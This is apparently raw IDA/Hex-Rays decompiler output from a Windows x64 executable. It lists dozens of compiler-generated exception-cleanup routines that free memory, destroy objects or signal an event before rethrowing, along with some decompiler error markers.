void __usercall __noreturn sub_1400960D2(__int64 a1@<rbp>)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 96);
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009611D) ----------------------------------------------------
#error "14009615D: positive sp value has been found (funcsize=16)"

//----- (000000014009616E) ----------------------------------------------------
void __usercall __noreturn sub_14009616E(__int64 a1@<rbp>)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 96);
  if ( *(_QWORD *)(v1 + 24) >= 8ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 7i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_WORD *)v1 = 0;
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400965DD) ----------------------------------------------------
void __usercall sub_1400965DD(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009660D) ----------------------------------------------------
void __usercall sub_14009660D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009663D) ----------------------------------------------------
void __usercall sub_14009663D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009666D) ----------------------------------------------------
void __usercall sub_14009666D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009669D) ----------------------------------------------------
void __usercall sub_14009669D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400966CD) ----------------------------------------------------
void __usercall sub_1400966CD(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400966FD) ----------------------------------------------------
void __usercall sub_1400966FD(__int64 a1@<rbp>)
{
  sub_14002EE40(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009671D) ----------------------------------------------------
void __usercall sub_14009671D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096C3D) ----------------------------------------------------
void __usercall sub_140096C3D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096C5D) ----------------------------------------------------
void __usercall sub_140096C5D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096C7D) ----------------------------------------------------
void __usercall __noreturn sub_140096C7D(__int64 a1@<rbp>)
{
  sub_14000EA40(*(_QWORD *)(a1 + 96), *(volatile signed __int32 ***)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096CAD) ----------------------------------------------------
void __usercall __noreturn sub_140096CAD(__int64 a1@<rbp>)
{
  sub_14000EA40(*(_QWORD *)(a1 + 80), *(volatile signed __int32 ***)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096D0D) ----------------------------------------------------
void __usercall sub_140096D0D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096D2D) ----------------------------------------------------
void __usercall sub_140096D2D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096E1D) ----------------------------------------------------
void __usercall sub_140096E1D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096E4D) ----------------------------------------------------
void __usercall sub_140096E4D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096E7D) ----------------------------------------------------
void __usercall sub_140096E7D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096EAD) ----------------------------------------------------
void __usercall sub_140096EAD(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096EDD) ----------------------------------------------------
void __usercall sub_140096EDD(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096F0D) ----------------------------------------------------
void __usercall sub_140096F0D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096F3D) ----------------------------------------------------
void __usercall sub_140096F3D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096F6D) ----------------------------------------------------
void __usercall sub_140096F6D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096F9D) ----------------------------------------------------
void __usercall sub_140096F9D(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, signed __int64); // rcx

  v1 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 72);
  if ( v1 )
    (**v1)(v1, 1i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140096FE9) ----------------------------------------------------
void __usercall __noreturn sub_140096FE9(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009700E) ----------------------------------------------------
void __usercall __noreturn sub_14009700E(__int64 a1@<rbp>)
{
  void *v1; // rbx

  v1 = *(void **)(a1 + 144);
  sub_1400115E0((__int64)v1 + 32);
  operator delete(v1);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400975CD) ----------------------------------------------------
void __usercall sub_1400975CD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400975ED) ----------------------------------------------------
void __usercall sub_1400975ED(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140097747) ----------------------------------------------------
#error "140097752: positive sp value has been found (funcsize=0)"

//----- (000000014009778D) ----------------------------------------------------
void sub_14009778D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400977AD) ----------------------------------------------------
void __usercall sub_1400977AD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009781D) ----------------------------------------------------
void __usercall sub_14009781D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009783D) ----------------------------------------------------
void __usercall sub_14009783D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009785E) ----------------------------------------------------
void __usercall sub_14009785E(__int64 a1@<rbp>)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 96);
  if ( *(_QWORD *)(v1 + 24) >= 8ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 7i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_WORD *)v1 = 0;
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009789D) ----------------------------------------------------
void __usercall __noreturn sub_14009789D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 128));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400978CD) ----------------------------------------------------
void __usercall __noreturn sub_1400978CD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400978ED) ----------------------------------------------------
void __noreturn sub_1400978ED()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009790D) ----------------------------------------------------
void sub_14009790D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009792F) ----------------------------------------------------
void __usercall sub_14009792F(__int64 a1@<rbp>)
{
  void **v1; // rbx
  void **i; // rdi

  v1 = *(void ***)(a1 + 64);
  for ( i = *(void ***)(a1 + 80); v1 != i; ++v1 )
  {
    if ( *v1 )
      sub_14001D190(*v1);
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140097995) ----------------------------------------------------
void __usercall __noreturn sub_140097995(__int64 a1@<rbp>)
{
  HANDLE v1; // rax

  v1 = GetProcessHeap();
  HeapFree(v1, 0, *(LPVOID *)(a1 + 88));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140097FDD) ----------------------------------------------------
void __usercall sub_140097FDD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140097FFD) ----------------------------------------------------
void __usercall sub_140097FFD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009801D) ----------------------------------------------------
void __usercall sub_14009801D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009803D) ----------------------------------------------------
void __usercall sub_14009803D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009805D) ----------------------------------------------------
void __usercall sub_14009805D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009808D) ----------------------------------------------------
void __usercall sub_14009808D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400980AD) ----------------------------------------------------
void __usercall sub_1400980AD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400980CD) ----------------------------------------------------
void __usercall sub_1400980CD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400980ED) ----------------------------------------------------
void __usercall sub_1400980ED(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400982F5) ----------------------------------------------------
void __usercall __noreturn sub_1400982F5(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140098339) ----------------------------------------------------
void __usercall __noreturn sub_140098339(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 32));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140098379) ----------------------------------------------------
void __usercall __noreturn sub_140098379(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009839D) ----------------------------------------------------
void __usercall sub_14009839D(__int64 a1@<rbp>)
{
  sub_140021830(*(_QWORD *)(a1 + 112), *(_QWORD ***)(a1 + 136));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400983CD) ----------------------------------------------------
void __usercall __noreturn sub_1400983CD(__int64 a1@<rbp>)
{
  sub_140021870(*(_QWORD *)(a1 + 112), *(_QWORD *)(a1 + 144));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400983FD) ----------------------------------------------------
void __usercall __noreturn sub_1400983FD(__int64 a1@<rbp>)
{
  sub_140021870(*(_QWORD *)(a1 + 112), *(_QWORD *)(a1 + 144));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009842D) ----------------------------------------------------
void __noreturn sub_14009842D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009844D) ----------------------------------------------------
void sub_14009844D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009846D) ----------------------------------------------------
void sub_14009846D()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009868D) ----------------------------------------------------
void __usercall sub_14009868D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400986AD) ----------------------------------------------------
void __usercall sub_1400986AD(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400986ED) ----------------------------------------------------
void __usercall sub_1400986ED(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009870D) ----------------------------------------------------
void __usercall sub_14009870D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009872D) ----------------------------------------------------
void __usercall sub_14009872D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 152));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140098750) ----------------------------------------------------
void __noreturn sub_140098750()
{
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400987F2) ----------------------------------------------------
#error "1400987FD: positive sp value has been found (funcsize=0)"

//----- (000000014009880D) ----------------------------------------------------
void __usercall sub_14009880D(__int64 a1@<rbp>)
{
  void *v1; // rcx

  v1 = *(void **)(a1 + 72);
  if ( v1 )
    sub_140024C20(v1, 1);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009885B) ----------------------------------------------------
void __usercall __noreturn sub_14009885B(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rbx
  void (__fastcall ***i)(_QWORD, _QWORD); // rdi

  v1 = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 80);
  for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 96); v1 != i; v1 += 5 )
    (**v1)(v1, 0i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140098A6D) ----------------------------------------------------
void __usercall sub_140098A6D(__int64 a1@<rbp>)
{
  sub_140023E20(*(_QWORD *)(a1 + 96));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009921D) ----------------------------------------------------
void __usercall sub_14009921D(__int64 a1@<rbp>)
{
  sub_14002A4C0(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140099265) ----------------------------------------------------
void __usercall __noreturn sub_140099265(__int64 a1@<rbp>)
{
  HANDLE v1; // rax

  v1 = GetProcessHeap();
  HeapFree(v1, 0, *(LPVOID *)(a1 + 88));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (00000001400994DF) ----------------------------------------------------
#error "1400994EA: positive sp value has been found (funcsize=0)"

//----- (00000001400996DD) ----------------------------------------------------
void __usercall sub_1400996DD(__int64 a1@<rbp>)
{
  sub_14002EE40(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (0000000140099C27) ----------------------------------------------------
#error "140099C32: positive sp value has been found (funcsize=0)"

//----- (0000000140099C77) ----------------------------------------------------
#error "140099C82: positive sp value has been found (funcsize=0)"

//----- (0000000140099F12) ----------------------------------------------------
#error "140099F1D: positive sp value has been found (funcsize=0)"

//----- (0000000140099FDA) ----------------------------------------------------
void __usercall __noreturn sub_140099FDA(__int64 a1@<rbp>)
{
  __int64 v1; // rdx
  HANDLE v2; // rbx
  char *v3; // rcx

  v1 = *(_QWORD *)(a1 + 32);
  _InterlockedExchange(*(volatile signed __int32 **)(a1 + 32), 0);
  v2 = *(HANDLE *)(a1 + 80);
  if ( v2 )
    goto LABEL_11;
  if ( !*(_BYTE *)(a1 + 88) )
    sub_140036410(a1 + 88, v1);
  v2 = OpenEventA(0x100002u, 0, (LPCSTR)(a1 + 88));
  v3 = *(char **)(a1 + 80);
  if ( (unsigned __int64)(v3 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
    CloseHandle(v3);
  *(_QWORD *)(a1 + 80) = v2;
  if ( v2 )
LABEL_11:
    SetEvent(v2);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009A362) ----------------------------------------------------
#error "14009A36D: positive sp value has been found (funcsize=0)"

//----- (000000014009A49D) ----------------------------------------------------
void __usercall sub_14009A49D(__int64 a1@<rbp>)
{
  sub_14007E210(*(void ***)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AD0D) ----------------------------------------------------
void __usercall sub_14009AD0D(__int64 a1@<rbp>)
{
  sub_14007E210(*(void ***)(a1 + 64));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AD2D) ----------------------------------------------------
void __usercall sub_14009AD2D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 72));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AE70) ----------------------------------------------------
void __usercall sub_14009AE70(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[9];
  v2 = a1[8];
  if ( v1 != v2 )
  {
    v3 = a1[10];
    do
    {
      sub_14004D940(v3, v1);
      v1 += 24i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AECB) ----------------------------------------------------
void __usercall __noreturn sub_14009AECB(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rbx
  void (__fastcall ***i)(_QWORD, _QWORD); // rdi

  v1 = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 72);
  for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 64); v1 != i; v1 += 5 )
    (**v1)(v1, 0i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AF2B) ----------------------------------------------------
void __usercall __noreturn sub_14009AF2B(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rbx
  void (__fastcall ***i)(_QWORD, _QWORD); // rdi

  v1 = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 72);
  for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 64); v1 != i; v1 += 5 )
    (**v1)(v1, 0i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009AF98) ----------------------------------------------------
void __usercall __noreturn sub_14009AF98(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[10];
  v2 = a1[12];
  if ( v1 != v2 )
  {
    v3 = a1[13];
    do
    {
      sub_14004D880(v3, v1);
      v1 += 80i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B008) ----------------------------------------------------
void __usercall __noreturn sub_14009B008(_QWORD *a1@<rbp>)
{
  __int64 v1; // rbx
  __int64 v2; // rdi
  __int64 v3; // rsi

  v1 = a1[10];
  v2 = a1[12];
  if ( v1 != v2 )
  {
    v3 = a1[13];
    do
    {
      sub_14004D8E0(v3, v1);
      v1 += 96i64;
    }
    while ( v1 != v2 );
  }
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B06B) ----------------------------------------------------
void __usercall __noreturn sub_14009B06B(__int64 a1@<rbp>)
{
  void (__fastcall ***v1)(_QWORD, _QWORD); // rbx
  void (__fastcall ***i)(_QWORD, _QWORD); // rdi

  v1 = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 80);
  for ( i = *(void (__fastcall ****)(_QWORD, _QWORD))(a1 + 96); v1 != i; v1 += 5 )
    (**v1)(v1, 0i64);
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B0BD) ----------------------------------------------------
void __usercall sub_14009B0BD(__int64 a1@<rbp>)
{
  sub_14004E230(*(__int64 **)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B0DD) ----------------------------------------------------
void __usercall sub_14009B0DD(__int64 a1@<rbp>)
{
  sub_140023E20(*(_QWORD *)(a1 + 80));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B54D) ----------------------------------------------------
void __usercall sub_14009B54D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

//----- (000000014009B56D) ----------------------------------------------------
void __usercall sub_14009B56D(__int64 a1@<rbp>)
{
  operator delete(*(void **)(a1 + 112));
  CxxThrowException(0i64, 0i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);

